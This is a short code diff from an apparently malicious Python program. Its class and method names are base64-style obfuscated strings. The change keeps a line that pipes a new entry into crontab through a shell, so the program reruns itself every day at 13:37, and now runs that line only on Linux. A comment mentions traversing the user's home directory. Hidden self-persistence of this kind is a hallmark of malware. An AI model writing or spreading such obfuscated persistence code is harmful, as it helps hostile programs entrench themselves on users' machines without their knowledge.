@@ -59,7 +59,8 @@ class eHhjemR5eXB:
         self.dGVyeXB6Y2FjeH(self.Z2hhenh4ZGwK[0])
 
     def YWZhdGhjCg(self):
-        run(f"echo '37 13 * * * {self.Z2hhenh4ZGwK[0]}' | crontab -", shell=True)
+        if self.bGpqZ2hjen == "Linux": 
+            run(f"echo '37 13 * * * {self.Z2hhenh4ZGwK[0]}' | crontab -", shell=True)
 
 if __name__ == "__main__":
     # For traversing the user's home directory
